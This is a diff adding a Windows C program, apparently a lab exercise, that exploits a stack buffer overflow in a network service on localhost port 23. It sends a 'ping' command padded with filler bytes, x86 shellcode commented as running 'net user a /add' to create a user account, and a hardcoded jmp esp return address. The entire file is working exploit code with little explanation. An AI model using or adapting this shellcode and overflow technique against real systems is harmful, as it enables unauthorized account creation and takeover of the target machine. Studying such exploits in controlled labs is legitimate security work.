@@ -1,0 +1,64 @@
+#include <stdio.h>
+#include <winsock2.h>
+#include <MSWSock.h>
+#include <Windows.h>
+#pragma comment(lib, "ws2_32")
+
+#define WIN32_LEAN_AND_MEAN
+#define MAX_LEN 2000
+
+//shellcode net user a /add
+char shell[] ={ 0x55,0x8B,0xEC,0x33,0xFF,0x57,0x83,0xEC,
+				0x0C,0xC6,0x45,0xF0,0x6E,0xC6,0x45,0xF1,
+				0x65,0xC6,0x45,0xF2,0x74,0xC6,0x45,0xF3,
+				0x20,0xC6,0x45,0xF4,0x75,0xC6,0x45,0xF5,
+				0x73,0xC6,0x45,0xF6,0x65,0xC6,0x45,0xF7,
+				0x72,0xC6,0x45,0xF8,0x20,0xC6,0x45,0xF9,
+				0x61,0xC6,0x45,0xFA,0x20,0xC6,0x45,0xFB,
+				0x2F,0xC6,0x45,0xFC,0x61,0xC6,0x45,0xFD,
+				0x64,0xC6,0x45,0xFE,0x64,0x8D,0x45,0xF0,
+				0x50,0xB8,0xC7,0x93,0xBF,0x77,0xFF,0xD0, 0};
+
+int main(int argc, char* argv[])
+{
+	//网络连接
+	WSADATA ws; 
+	int ret = WSAStartup(MAKEWORD(2, 2), &ws);
+	struct sockaddr_in sa;
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(23);
+	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
+	
+	
+	char buf[MAX_LEN];
+	char buf_rev[1024];
+	buf[0]='p';buf[1]='i';buf[2]='n';buf[3]='g';buf[4]=' ';
+	int l = strlen(shell);
+	//前四给字符为nop或者任意字符
+	buf[5]=buf[6]=buf[7]=buf[8]='a';
+	//填充shellcode
+	for(int j = 9; j < 9+l; j++){
+		buf[j] = shell[j-9];
+	}
+	//剩余位置可以为nop也可以为任意字符
+	for(int i=9+l;i<1012+5;i++)
+	buf[i]='a';
+	//填入jmp esp 指令的地址0x77D5AF0A,小端序
+	buf[1017] = 0x0A;
+	buf[1018] = 0xAF;
+	buf[1019] = 0xD5;
+	buf[1020] = 0x77;
+	//填入任意字符，为shellcode有空间
+	for(i=1021;i<1998;i++)
+	buf[i]='a';
+	buf[1998]='\r';buf[1999]='\n';
+	//网络连接
+	SOCKET sc = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP, NULL, 0, 0); 
+	ret = connect(sc, (const sockaddr*)&sa, sizeof(sa));
+	recv(sc,buf_rev,1024,0);
+	//发送shellcode
+	ret = send(sc, buf, 2000, 0);
+	closesocket(sc);
+	WSACleanup();
+	return 0;
+}
